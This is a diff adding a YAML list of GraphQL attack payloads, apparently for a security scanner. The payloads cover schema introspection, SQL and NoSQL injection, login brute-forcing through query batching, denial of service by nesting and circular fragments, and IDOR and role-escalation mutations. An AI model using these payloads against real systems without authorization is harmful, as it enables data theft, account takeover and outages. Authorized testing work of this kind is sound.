@@ -1,0 +1,132 @@
+# GraphQL Introspection and Injection Payloads with Metadata
+# Usage: Filter by type or context for targeted testing
+
+payloads:
+  # Introspection - full schema
+  - payload: '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}'
+    type: introspection
+    context: [API-endpoint]
+    detection: schema-disclosure
+
+  - payload: '{"query":"{__schema{queryType{name},mutationType{name},subscriptionType{name},types{name,kind,fields{name,type{name,kind,ofType{name}}}}}}"}'
+    type: introspection
+    context: [API-endpoint]
+    detection: schema-disclosure
+
+  - payload: '{"query":"{__schema{directives{name,description,locations,args{name,type{name}}}}}"}'
+    type: introspection
+    context: [API-endpoint]
+    detection: schema-disclosure
+
+  # Introspection - type enumeration
+  - payload: '{"query":"{__type(name:\"User\"){name,fields{name,type{name}}}}"}'
+    type: introspection
+    context: [API-endpoint]
+    detection: schema-disclosure
+
+  - payload: '{"query":"{__type(name:\"Query\"){fields{name,description,args{name,type{name,kind}}}}}"}'
+    type: introspection
+    context: [API-endpoint]
+    detection: schema-disclosure
+
+  - payload: '{"query":"{__type(name:\"Mutation\"){fields{name,args{name,type{name,kind}}}}}"}'
+    type: introspection
+    context: [API-endpoint]
+    detection: schema-disclosure
+
+  # Field suggestion abuse
+  - payload: '{"query":"{user{idz}}"}'
+    type: introspection
+    context: [API-endpoint]
+    detection: error-based
+    warning: "Intentional typo to trigger field suggestion in error message"
+
+  - payload: '{"query":"{passwor}"}'
+    type: introspection
+    context: [API-endpoint]
+    detection: error-based
+    warning: "Partial field name to trigger suggestion disclosure"
+
+  # Injection - SQL via arguments
+  - payload: '{"query":"{user(id:\"1 OR 1=1\"){name,email}}"}'
+    type: injection
+    context: [API-endpoint]
+    detection: error-based
+
+  - payload: '{"query":"{user(name:\"admin'' OR ''1''=''1\"){id,email,role}}"}'
+    type: injection
+    context: [API-endpoint]
+    detection: error-based
+
+  - payload: '{"query":"mutation{login(username:\"admin'' OR ''1''=''1\",password:\"x\"){token}}"}'
+    type: injection
+    context: [mutation]
+    detection: auth-observation
+
+  # Injection - NoSQL via arguments
+  - payload: '{"query":"{user(filter:{username:{$ne:\"\"},password:{$ne:\"\"}}){id,name}}"}'
+    type: injection
+    context: [API-endpoint]
+    detection: auth-observation
+
+  # Query batching
+  - payload: '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"},{"query":"{user(id:3){name}}"}]'
+    type: batching
+    context: [API-endpoint]
+    detection: response-count
+    warning: "Batch query to bypass rate limiting"
+
+  - payload: '[{"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"pass3\"){token}}"}]'
+    type: batching
+    context: [API-endpoint, mutation]
+    detection: auth-observation
+    warning: "Batch brute-force login via query batching"
+
+  # DoS - deeply nested queries
+  - payload: '{"query":"{user{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}"}'
+    type: DoS
+    context: [API-endpoint]
+    detection: time-delay
+    warning: "Deeply nested query for resource exhaustion"
+
+  - payload: '{"query":"query{__schema{types{fields{type{fields{type{fields{type{name}}}}}}}}}"}'
+    type: DoS
+    context: [API-endpoint]
+    detection: time-delay
+    warning: "Recursive introspection for resource exhaustion"
+
+  # Fragment-based attacks
+  - payload: '{"query":"fragment Full on User{name,email,role,password}query{user(id:1){...Full}}"}'
+    type: authorization-bypass
+    context: [API-endpoint]
+    detection: data-disclosure
+
+  - payload: '{"query":"fragment A on User{friends{...B}}fragment B on User{friends{...A}}query{user(id:1){...A}}"}'
+    type: DoS
+    context: [API-endpoint]
+    detection: error-based
+    warning: "Circular fragment reference for DoS"
+
+  # Directive abuse
+  - payload: '{"query":"{user(id:1){name,email @include(if:true),password @include(if:true)}}"}'
+    type: authorization-bypass
+    context: [API-endpoint]
+    detection: data-disclosure
+
+  - payload: '{"query":"{user(id:1){name @deprecated(reason:\"test\")}}"}'
+    type: authorization-bypass
+    context: [API-endpoint]
+    detection: error-based
+
+  # Authorization bypass - IDOR
+  - payload: '{"query":"{user(id:2){id,name,email,role,ssn}}"}'
+    type: authorization-bypass
+    context: [API-endpoint]
+    detection: data-disclosure
+    warning: "IDOR via sequential ID enumeration"
+
+  - payload: '{"query":"mutation{updateUser(id:2,input:{role:\"admin\"}){id,role}}"}'
+    type: authorization-bypass
+    context: [mutation]
+    detection: auth-observation
+    warning: "Privilege escalation via mutation IDOR"
